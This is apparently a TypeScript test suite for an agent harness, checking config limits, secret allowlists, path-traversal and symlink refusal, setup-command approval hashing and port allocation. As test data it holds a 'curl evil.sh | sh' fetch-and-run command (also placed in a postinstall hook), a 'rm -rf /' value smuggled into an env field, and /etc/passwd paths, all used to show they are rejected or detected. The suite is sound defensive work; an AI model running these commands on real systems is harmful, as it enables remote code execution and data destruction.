// Local config, repo config, approvals and resources: the parts of harnessd that decide what's allowed.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import net from 'node:net';
import path from 'node:path';
import { Approvals, setupHash, testHash } from '../src/approvals.ts';
import { loadConfig, parseConfig, resolveSecrets } from '../src/config.ts';
import { effectivePolicy, readRepoConfig } from '../src/repo-config.ts';
import { agentConfigDir, PortAllocator } from '../src/resources.ts';
import { tempDir, tempHome, TOKEN } from './fixtures.ts';

let t: ReturnType<typeof tempDir>;
before(() => { t = tempDir('local'); });
after(() => t?.cleanup());

const BASE = { device_id: 'dev_a', principal: 'human_a', projects: [{ id: 'prj_a', repo: '/repo', secrets: ['DB_URL'] }] };

test('config: defaults follow D-38 and D-68', () => {
  const c = parseConfig(BASE, TOKEN);
  assert.deepEqual(c.limits, { maxConcurrentAgents: 2, portsPerAgent: 10, portRange: [3100, 3999] });
  assert.equal(c.serverUrl, 'ws://127.0.0.1:7400');
  assert.deepEqual(c.projects, [{ id: 'prj_a', repo: '/repo', baseBranch: 'main', secrets: ['DB_URL'] }]);
});

test('config: refuses port ranges in the ephemeral range, relative repos, and more than 2 agents', () => {
  assert.throws(() => parseConfig({ ...BASE, limits: { port_range: [40000, 40100] } }, TOKEN), /port_range/);
  assert.throws(() => parseConfig({ ...BASE, projects: [{ id: 'p', repo: 'relative' }] }, TOKEN), /absolute/);
  assert.throws(() => parseConfig({ ...BASE, limits: { max_concurrent_agents: 3 } }, TOKEN), /max_concurrent_agents/);
});

test('config: the token file must be private', () => {
  const home = tempHome(path.join(t.dir, 'tok'));
  fs.writeFileSync(home.config, 'device_id = "dev_a"\nprincipal = "human_a"\n');
  assert.equal(loadConfig(home).token, TOKEN);
  fs.chmodSync(home.token, 0o644);
  assert.throws(() => loadConfig(home), /chmod 600/);
});

test('secrets: only allowlisted names reach a task, from an owner-only file', () => {
  const home = tempHome(path.join(t.dir, 'sec'));
  fs.writeFileSync(home.secrets, 'DB_URL = "postgres://x"\nOTHER = "nope"\n', { mode: 0o600 });
  const policy = effectivePolicy(parseConfig(BASE, TOKEN), parseConfig(BASE, TOKEN).projects[0]!, { setup: null, test: null, envRefs: ['DB_URL', 'OTHER', 'MISSING'], portsPerAgent: null, maxConcurrentAgents: null });
  assert.deepEqual(policy.secretNames, ['DB_URL']);
  assert.deepEqual(resolveSecrets(home, policy.secretNames), { DB_URL: 'postgres://x' });
});

test('harness.yaml: the repo can only narrow local limits', () => {
  const wt = path.join(t.dir, 'wt-narrow');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, 'harness.yaml'), 'ports:\n  per_agent: 50\nlimits:\n  max_concurrent_agents: 1\n');
  const local = parseConfig(BASE, TOKEN);
  const policy = effectivePolicy(local, local.projects[0]!, readRepoConfig(wt));
  assert.deepEqual([policy.portsPerAgent, policy.maxConcurrentAgents], [10, 1]);
});

test('harness.yaml: refuses path traversal, symlinks and malformed values', () => {
  const wt = path.join(t.dir, 'wt-bad');
  fs.mkdirSync(wt);
  const yaml = (s: string) => { fs.writeFileSync(path.join(wt, 'harness.yaml'), s); return () => readRepoConfig(wt); };
  assert.throws(yaml('setup:\n  command: npm ci\n  manifests: [../../etc/passwd]\n'), /inside the repo/);
  assert.throws(yaml('setup:\n  command: npm ci\n  manifests: [/etc/passwd]\n'), /inside the repo/);
  fs.symlinkSync('/etc/hosts', path.join(wt, 'link.json'));
  assert.throws(yaml('setup:\n  command: npm ci\n  manifests: [link.json]\n'), /regular file/);
  assert.throws(yaml('setup:\n  command: 42\n'), /setup.command/);
  assert.throws(yaml('env:\n  refs: ["lower; rm -rf /"]\n'), /env.refs/);
  fs.rmSync(path.join(wt, 'harness.yaml'));
  fs.symlinkSync('/etc/hosts', path.join(wt, 'harness.yaml'));
  assert.throws(() => readRepoConfig(wt), /regular file/);
});

test('harness.yaml: a test command for the land step, validated like setup; its approval is a separate kind (D-51)', () => {
  const wt = path.join(t.dir, 'wt-test');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, 'package.json'), '{}');
  fs.writeFileSync(path.join(wt, 'harness.yaml'), 'setup:\n  command: npm ci\n  manifests: [package.json]\ntest:\n  command: npm test\n  manifests: [package.json]\n  timeout_seconds: 300\n');
  const r = readRepoConfig(wt);
  assert.deepEqual(r.test, { command: 'npm test', manifests: ['package.json'], timeoutSeconds: 300 });
  fs.writeFileSync(path.join(wt, 'harness.yaml'), 'test:\n  command: npm test\n  manifests: [../x]\n');
  assert.throws(() => readRepoConfig(wt), /inside the repo/);
  fs.writeFileSync(path.join(wt, 'harness.yaml'), 'test:\n  command: ""\n');
  assert.throws(() => readRepoConfig(wt), /test.command/);
  // The same text approved as setup never counts as an approved test command, and the other way round.
  assert.notEqual(setupHash(wt, 'npm test', ['package.json']).hash, testHash(wt, 'npm test', ['package.json']).hash);
});

test('approvals: the hash covers the command and every manifest\'s content', () => {
  const wt = path.join(t.dir, 'wt-hash');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, 'package.json'), '{}');
  const a = setupHash(wt, 'npm ci', ['package.json', 'package-lock.json']);
  assert.equal(a.manifests[1]!.sha256, null, 'an absent manifest is part of the hash too');
  assert.notEqual(setupHash(wt, 'npm ci && curl evil.sh | sh', ['package.json', 'package-lock.json']).hash, a.hash);
  fs.writeFileSync(path.join(wt, 'package.json'), '{"scripts":{"postinstall":"curl evil.sh | sh"}}');
  assert.notEqual(setupHash(wt, 'npm ci', ['package.json', 'package-lock.json']).hash, a.hash);
});

test('approvals: request, list, approve', () => {
  const home = tempHome(path.join(t.dir, 'appr'));
  const approvals = new Approvals(home);
  const hash = 'ab'.repeat(32);
  assert.equal(approvals.isApproved('prj_a', hash), false);
  const req = approvals.request({ projectId: 'prj_a', taskId: 't1', command: 'npm ci', manifests: [], hash });
  approvals.request({ projectId: 'prj_a', taskId: 't2', command: 'npm ci', manifests: [], hash });
  assert.deepEqual(approvals.pending().map((r) => [r.id, r.taskId]), [[req.id, 't1']], 'one request per hash');
  assert.throws(() => approvals.approve('zz'), /no pending approval/);
  approvals.approve(req.id.slice(0, 6));
  assert.equal(approvals.isApproved('prj_a', hash), true);
  assert.equal(approvals.isApproved('prj_other', hash), false, 'approvals are per project');
  assert.deepEqual(approvals.pending(), []);
});

test('ports: one block per task, below the ephemeral range, capped, persisted, skipping busy ports', async () => {
  const home = tempHome(path.join(t.dir, 'ports'));
  const busy = net.createServer();
  await new Promise<void>((r) => busy.listen(31005, '127.0.0.1', r)); // inside the first block
  try {
    const ports = new PortAllocator(home, [31000, 31099], 10, 2);
    const a = await ports.allocate('task-a');
    assert.deepEqual(a, { base: 31010, count: 10 }, 'the block with a busy port is skipped');
    assert.deepEqual(await ports.allocate('task-a'), a, 'idempotent per task');
    assert.deepEqual(await ports.allocate('task-b', 3), { base: 31020, count: 3 });
    await assert.rejects(ports.allocate('task-c'), /max_concurrent_agents/);
    assert.deepEqual(new PortAllocator(home, [31000, 31099], 10, 2).list(), { 'task-a': a, 'task-b': { base: 31020, count: 3 } }, 'persisted');
    ports.release('task-a');
    assert.deepEqual(Object.keys(ports.list()), ['task-b']);
  } finally {
    busy.close();
  }
});

test('agent config dirs are per agent and owner-only', () => {
  const home = tempHome(path.join(t.dir, 'agents'));
  const dir = agentConfigDir(home, 'agent_abc123');
  assert.equal(fs.statSync(dir).mode & 0o777, 0o700);
  assert.notEqual(agentConfigDir(home, 'agent_def456'), dir);
  assert.throws(() => agentConfigDir(home, '../../etc'), /invalid agent id/);
});
